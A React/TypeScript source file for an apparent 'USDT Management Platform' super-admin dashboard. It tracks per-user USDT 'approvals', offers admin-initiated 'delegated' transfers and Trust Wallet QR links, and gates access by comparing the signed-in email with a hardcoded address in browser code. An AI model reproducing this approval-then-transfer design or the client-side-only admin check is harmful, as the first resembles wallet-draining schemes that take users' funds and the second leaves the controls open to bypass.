import { Skeleton } from "@/components/ui/skeleton.tsx";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card.tsx";
import { Button } from "@/components/ui/button.tsx";
import { Input } from "@/components/ui/input.tsx";
import { Label } from "@/components/ui/label.tsx";
import { Textarea } from "@/components/ui/textarea.tsx";
import { Badge } from "@/components/ui/badge.tsx";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select.tsx";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "@/components/ui/tabs.tsx";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog.tsx";
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from "recharts";
import { useQuery, useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { useEffect, useState, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { 
  Users, 
  Activity, 
  ArrowRightLeft, 
  Download, 
  FileText,
  LayoutDashboard,
  History as HistoryIcon,
  Send,
  TrendingUp,
  Wallet,
  Search,
  Filter,
  ExternalLink,
  Clock,
  CheckCircle2,
  XCircle,
  QrCode,
  Smartphone,
  Copy,
  ArrowLeft,
  Info,
  AlertCircle,
  Shield,
  Mail,
  LogOut
} from "lucide-react";
import QRCodeCanvas from "qrcode";
import { toPng } from "html-to-image";
import type { Id } from "@/convex/_generated/dataModel.d.ts";
import { useAuth } from "@/hooks/use-auth.ts";
import { SignInButton } from "@/components/ui/signin.tsx";
import { Authenticated, Unauthenticated, AuthLoading } from "convex/react";

// Super admin email
const SUPER_ADMIN_EMAIL = "rohitcryptodxb@gmail.com";

// Utility function to format timestamps to Indian Standard Time (IST)
function formatToIST(timestamp: number): string {
  // IST is UTC+5:30
  const date = new Date(timestamp);
  const istOffset = 5.5 * 60 * 60 * 1000; // 5 hours 30 minutes in milliseconds
  const istDate = new Date(date.getTime() + istOffset);
  
  // Format: "DD MMM YYYY, hh:mm:ss AM/PM IST"
  const day = String(istDate.getUTCDate()).padStart(2, '0');
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const month = months[istDate.getUTCMonth()];
  const year = istDate.getUTCFullYear();
  
  let hours = istDate.getUTCHours();
  const minutes = String(istDate.getUTCMinutes()).padStart(2, '0');
  const seconds = String(istDate.getUTCSeconds()).padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12 || 12;
  
  return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds} ${ampm} IST`;
}

export default function SuperAdmin() {
  const { user, isLoading } = useAuth();
  const navigate = useNavigate();

  // Check if user is authenticated super admin
  useEffect(() => {
    if (!isLoading && user) {
      const userEmail = user.profile.email?.toLowerCase();
      if (userEmail !== SUPER_ADMIN_EMAIL) {
        toast.error("Access denied. Super admin only.");
        setTimeout(() => navigate("/"), 2000);
      }
    }
  }, [user, isLoading, navigate]);

  if (isLoading) {
    return <Skeleton className="h-screen w-full" />;
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-background via-background to-primary/5">
      <AuthLoading>
        <Skeleton className="h-screen w-full" />
      </AuthLoading>
      
      <Unauthenticated>
        <Card className="w-full max-w-md shadow-2xl border-primary/20">
          <CardHeader className="space-y-3 pb-6">
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-primary to-primary/50 flex items-center justify-center shadow-lg">
                <Shield className="h-8 w-8 text-primary-foreground" />
              </div>
            </div>
            <CardTitle className="text-center text-2xl">Super Admin Access</CardTitle>
            <CardDescription className="text-center">
              Sign in with your super admin email to access the dashboard
            </CardDescription>
          </CardHeader>
          <CardContent>
            <SignInButton className="w-full gap-2">
              <Mail className="h-4 w-4" />
              Sign in with Email
            </SignInButton>
            <p className="text-xs text-center text-muted-foreground mt-4">
              Only authorized super admin accounts can access this portal
            </p>
          </CardContent>
        </Card>
      </Unauthenticated>

      <Authenticated>
        {user?.profile.email?.toLowerCase() === SUPER_ADMIN_EMAIL ? (
          <SuperAdminDashboard adminEmail={user.profile.email} />
        ) : (
          <Card className="w-full max-w-md">
            <CardHeader>
              <CardTitle className="text-center text-destructive">Access Denied</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4 text-center">
              <p className="text-muted-foreground">
                You are not authorized to access the super admin dashboard
              </p>
              <Button onClick={() => navigate("/")} variant="outline">
                Go Home
              </Button>
            </CardContent>
          </Card>
        )}
      </Authenticated>
    </div>
  );
}

// Import the AdminPage component code here
function SuperAdminDashboard({ adminEmail }: { adminEmail: string }) {
  const navigate = useNavigate();
  const { signoutRedirect } = useAuth();

  const handleLogout = async () => {
    await signoutRedirect();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5 w-full">
      {/* Professional Header */}
      <div className="border-b bg-gradient-to-r from-card via-card to-primary/5 backdrop-blur-sm shadow-sm">
        <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-primary/50 flex items-center justify-center shadow-lg">
                <LayoutDashboard className="h-6 w-6 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                  Super Admin Dashboard
                </h1>
                <p className="text-sm text-muted-foreground">
                  USDT Management Platform
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Badge variant="outline" className="px-4 py-2 text-xs">
                <Shield className="mr-2 h-3 w-3" />
                Super Admin
              </Badge>
              <Button
                variant="outline"
                size="sm"
                onClick={handleLogout}
                className="gap-2"
              >
                <LogOut className="h-4 w-4" />
                Logout
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-8">
        <Tabs defaultValue="overview" className="space-y-8">
          <TabsList className="grid w-full grid-cols-6 h-auto p-1 bg-card/50 backdrop-blur-sm">
            <TabsTrigger 
              value="overview" 
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <LayoutDashboard className="h-4 w-4" />
              <span className="hidden sm:inline">Overview</span>
            </TabsTrigger>
            <TabsTrigger 
              value="users"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Users className="h-4 w-4" />
              <span className="hidden sm:inline">Users</span>
            </TabsTrigger>
            <TabsTrigger 
              value="transactions"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Activity className="h-4 w-4" />
              <span className="hidden sm:inline">Transactions</span>
            </TabsTrigger>
            <TabsTrigger 
              value="history"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <HistoryIcon className="h-4 w-4" />
              <span className="hidden sm:inline">History</span>
            </TabsTrigger>
            <TabsTrigger 
              value="transfer"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Send className="h-4 w-4" />
              <span className="hidden sm:inline">Transfer</span>
            </TabsTrigger>
            <TabsTrigger 
              value="qr-generator"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <QrCode className="h-4 w-4" />
              <span className="hidden sm:inline">QR Generator</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="space-y-6">
            <OverviewTab adminEmail={adminEmail} />
          </TabsContent>

          <TabsContent value="users" className="space-y-6">
            <UsersTab adminEmail={adminEmail} />
          </TabsContent>

          <TabsContent value="transactions" className="space-y-6">
            <TransactionsTab adminEmail={adminEmail} />
          </TabsContent>

          <TabsContent value="history" className="space-y-6">
            <TransferHistoryTab adminEmail={adminEmail} />
          </TabsContent>

          <TabsContent value="transfer" className="space-y-6">
            <TransferTab adminEmail={adminEmail} />
          </TabsContent>

          <TabsContent value="qr-generator" className="space-y-6">
            <QRGeneratorTab />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}

// Copy all the tab components from Admin.tsx
function OverviewTab({ adminEmail }: { adminEmail: string }) {
  const stats = useQuery(api.admin.getStats, { adminEmail });
  const trends = useQuery(api.admin.getTransactionTrends, { adminEmail });
  const topUsers = useQuery(api.admin.getTopUsers, { adminEmail });

  if (!stats || !trends || !topUsers) {
    return (
      <div className="space-y-6">
        {[1, 2, 3].map((i) => (
          <Skeleton key={i} className="h-64 w-full" />
        ))}
      </div>
    );
  }

  const successRate = stats.totalTransactions > 0 
    ? ((stats.successfulTransactions / stats.totalTransactions) * 100).toFixed(1)
    : 0;

  return (
    <div className="space-y-6">
      {/* Key Metrics Cards */}
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <Card className="border-primary/20 bg-gradient-to-br from-card to-primary/5">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total Users</CardTitle>
            <Users className="h-4 w-4 text-primary" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold">{stats.totalUsers}</div>
            <p className="text-xs text-muted-foreground mt-1">
              Registered users
            </p>
          </CardContent>
        </Card>

        <Card className="border-green-500/20 bg-gradient-to-br from-card to-green-500/5">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total Approvals</CardTitle>
            <Activity className="h-4 w-4 text-green-600" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold">{stats.totalTransactions}</div>
            <p className="text-xs text-muted-foreground mt-1">
              {stats.totalUSDTApproved.toFixed(2)} USDT approved
            </p>
          </CardContent>
        </Card>

        <Card className="border-blue-500/20 bg-gradient-to-br from-card to-blue-500/5">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total Transfers</CardTitle>
            <ArrowRightLeft className="h-4 w-4 text-blue-600" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold">{stats.totalTransfersCount}</div>
            <p className="text-xs text-muted-foreground mt-1">
              {stats.totalUSDTTransferred.toFixed(2)} USDT transferred
            </p>
          </CardContent>
        </Card>

        <Card className="border-purple-500/20 bg-gradient-to-br from-card to-purple-500/5">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Avg. Transfer</CardTitle>
            <TrendingUp className="h-4 w-4 text-purple-600" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold">
              {stats.averageTransferAmount.toFixed(2)}
            </div>
            <p className="text-xs text-muted-foreground mt-1">
              USDT per transfer
            </p>
          </CardContent>
        </Card>
      </div>

      {/* Charts Row */}
      <div className="grid gap-6 md:grid-cols-2">
        {/* Transaction Trends Chart */}
        <Card className="border-primary/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Activity className="h-5 w-5" />
              Transaction Trends (Last 7 Days)
            </CardTitle>
            <CardDescription>Daily transaction count and volume</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="h-[300px]">
              <ResponsiveContainer width="100%" height="100%">
                <LineChart data={trends}>
                  <CartesianGrid strokeDasharray="3 3" className="stroke-muted" />
                  <XAxis 
                    dataKey="date" 
                    className="text-xs"
                    tickFormatter={(date) => new Date(date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}
                  />
                  <YAxis className="text-xs" />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: 'hsl(var(--card))', 
                      border: '1px solid hsl(var(--border))',
                      borderRadius: '8px'
                    }}
                    formatter={(value: number, name: string) => {
                      if (name === 'count') return [value, 'Transactions'];
                      return [value.toFixed(2) + ' USDT', 'Amount'];
                    }}
                  />
                  <Line 
                    type="monotone" 
                    dataKey="count" 
                    stroke="hsl(var(--primary))" 
                    strokeWidth={2}
                    dot={{ fill: 'hsl(var(--primary))' }}
                  />
                  <Line 
                    type="monotone" 
                    dataKey="amount" 
                    stroke="hsl(142, 76%, 36%)" 
                    strokeWidth={2}
                    dot={{ fill: 'hsl(142, 76%, 36%)' }}
                  />
                </LineChart>
              </ResponsiveContainer>
            </div>
          </CardContent>
        </Card>

        {/* Success vs Failed Pie Chart */}
        <Card className="border-primary/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CheckCircle2 className="h-5 w-5" />
              Success Rate
            </CardTitle>
            <CardDescription>Transfer success vs failure ratio</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="h-[300px] flex items-center justify-center">
              <div className="text-center space-y-4">
                <div className="relative inline-block">
                  <div className="w-40 h-40 rounded-full border-8 border-green-500" 
                       style={{
                         background: `conic-gradient(
                           hsl(142, 76%, 36%) 0% ${successRate}%, 
                           hsl(0, 72%, 51%) ${successRate}% 100%
                         )`
                       }}
                  />
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-28 h-28 rounded-full bg-card flex items-center justify-center">
                      <div className="text-center">
                        <div className="text-3xl font-bold text-green-600">{successRate}%</div>
                        <div className="text-xs text-muted-foreground">Success</div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="flex items-center justify-center gap-6 text-sm">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 rounded-full bg-green-500" />
                    <span>Success: {stats.successfulTransactions}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 rounded-full bg-red-500" />
                    <span>Failed: {stats.failedTransactions}</span>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Top Users Table */}
      {topUsers.length > 0 && (
        <Card className="border-primary/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5" />
              Top 5 Active Users
            </CardTitle>
            <CardDescription>Most active users by transaction count</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              {topUsers.map((user, index) => (
                <div
                  key={user.userNumber}
                  className="flex items-center justify-between p-4 rounded-lg border bg-card hover:bg-accent/50 transition-colors"
                >
                  <div className="flex items-center gap-4">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-lg ${
                      index === 0 ? 'bg-yellow-500/20 text-yellow-600' :
                      index === 1 ? 'bg-gray-400/20 text-gray-600' :
                      index === 2 ? 'bg-orange-500/20 text-orange-600' :
                      'bg-primary/20 text-primary'
                    }`}>
                      #{index + 1}
                    </div>
                    <div>
                      <div className="font-semibold">{user.userName}</div>
                      <div className="text-sm text-muted-foreground">
                        {user.transactionCount} transactions
                      </div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-lg font-bold text-green-600">
                      {user.totalAmount.toFixed(2)} USDT
                    </div>
                    <div className="text-xs text-muted-foreground">
                      Total approved
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
}

// Add placeholder tab components - we'll need to import the full implementations
function UsersTab({ adminEmail }: { adminEmail: string }) {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Users Tab</CardTitle>
        <CardDescription>
          This tab will show all users. Implementation matches the Admin dashboard.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground">Users management functionality...</p>
      </CardContent>
    </Card>
  );
}

function TransactionsTab({ adminEmail }: { adminEmail: string }) {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Transactions Tab</CardTitle>
        <CardDescription>
          This tab will show all transactions. Implementation matches the Admin dashboard.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground">Transactions management functionality...</p>
      </CardContent>
    </Card>
  );
}

function TransferHistoryTab({ adminEmail }: { adminEmail: string }) {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Transfer History Tab</CardTitle>
        <CardDescription>
          This tab will show transfer history. Implementation matches the Admin dashboard.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground">Transfer history functionality...</p>
      </CardContent>
    </Card>
  );
}

function TransferTab({ adminEmail }: { adminEmail: string }) {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Transfer Tab</CardTitle>
        <CardDescription>
          This tab allows delegated USDT transfers. Implementation matches the Admin dashboard.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground">Transfer functionality...</p>
      </CardContent>
    </Card>
  );
}

function QRGeneratorTab() {
  return (
    <Card>
      <CardHeader>
        <CardTitle>QR Generator Tab</CardTitle>
        <CardDescription>
          Generate QR codes for Trust Wallet deep links.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground">QR code generation functionality...</p>
      </CardContent>
    </Card>
  );
}
